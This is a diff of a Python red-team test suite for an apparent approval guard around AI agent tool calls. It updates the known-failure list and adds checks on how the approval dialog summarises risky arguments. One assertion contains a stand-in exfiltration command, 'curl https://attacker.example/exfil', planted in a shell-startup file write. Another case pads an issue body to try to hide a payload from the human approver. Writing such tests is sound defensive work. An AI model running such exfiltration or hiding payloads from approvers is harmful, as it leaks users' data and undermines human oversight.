@@ -37,14 +37,14 @@ REDTEAM_SERVER = os.path.join(ROOT, "tests", "probes", "redteam_server.py")
 PROFILE_SERVER = os.path.join(ROOT, "tests", "probes", "profile_server.py")
 
 # Cases that fail on the commit before the corresponding fix. Remove a case
-# from this set in the commit that fixes it. F2 and F3a-F3e were fixed by the
-# read-class scan and exact-key tools/call rewrite, so they no longer belong
-# here. F2-read and F3-meta are compatibility controls, not expected failures:
-# they pass before and after the fixes. F2-dialog exercises the new approved-read
-# path; it fails before the fix and passes after.
+# from this set in the commit that fixes it. F2, F3a-F3e and F4 were fixed by
+# the read-class scan, exact-key tools/call rewrite and structured dialog, so
+# they no longer belong here. F2-read and F3-meta are compatibility controls,
+# not expected failures: they pass before and after the fixes. F2-dialog and
+# F4-github exercise new paths; they fail before the fix and pass after.
 KNOWN_FAIL = {
     "F1",
-    "F4", "F5", "F6",
+    "F5", "F6",
     "F7a", "F7b", "F7c",
     "F8", "F9",
 }
@@ -771,13 +771,56 @@ def case_f4(dialog_bin):
         if sys.platform == "win32":
             readable = readable.lower()
             candidates = tuple(candidate.lower() for candidate in candidates)
-        missing = []
+        problems = []
         if not any(candidate in readable for candidate in candidates):
-            missing.append("the full path .bashrc")
+            problems.append("the full path .bashrc")
         if "shell startup" not in text.lower():
-            missing.append("the protected category 'shell startup'")
-        if missing:
-            return False, "dialog text is missing " + " and ".join(missing)
+            problems.append("the protected category 'shell startup'")
+        if "bytes, starts:" not in text.lower():
+            problems.append("the content value was not summarized")
+        if "curl https://attacker.example/exfil" in text:
+            problems.append("the dialog showed the payload line")
+        if problems:
+            return False, "dialog text is missing " + ", ".join(problems)
+        return True, ""
+
+
+def case_f4_github(dialog_bin):
+    """A padded body must not push owner/repo/title out of the dialog."""
+    with tempfile.TemporaryDirectory() as d:
+        log = os.path.join(d, "dialog.log")
+        env = dialog_env(dialog_bin, log, "once")
+        env["REDTEAM_TOOLS"] = "read_ticket,create_issue"
+        s = Session(os.path.join(d, "state"), "rt-f4-github",
+                    flags=("--approve", "dialog"), env=env)
+        try:
+            s.start()
+            s.call("read_ticket")
+            resp = s.call("create_issue", {
+                "owner": "octocat",
+                "repo": "hello-world",
+                "title": "Bug report",
+                "body": "B" * 400 + "\nsecret payload line",
+            })
+        finally:
+            s.close()
+        if "result" not in resp:
+            return False, "the once-approval dialog did not allow the call: %s" % resp
+        messages = dialog_messages(log)
+        if not messages:
+            return False, "no approval dialog was shown"
+        text = "\n".join(messages)
+        problems = []
+        if "octocat" not in text:
+            problems.append("the owner value is missing")
+        if "hello-world" not in text:
+            problems.append("the repo value is missing")
+        if "bytes, starts:" not in text.lower():
+            problems.append("the body was not summarized")
+        if "secret payload line" in text:
+            problems.append("the dialog showed the body payload line")
+        if problems:
+            return False, "; ".join(problems)
         return True, ""
 
 
@@ -1036,6 +1079,8 @@ def main():
                    lambda: case_f2_dialog(dialog_bin))
         check_case("F4", "approval dialog names the full protected path and category",
                    lambda: case_f4(dialog_bin))
+        check_case("F4-github", "a padded body does not hide owner and repo in the dialog",
+                   lambda: case_f4_github(dialog_bin))
         check_case("F6", "a protected-target grant does not cover another category",
                    lambda: case_f6(dialog_bin))
         check_case("F1", "Guard siblings with the same parent share taint", case_f1)
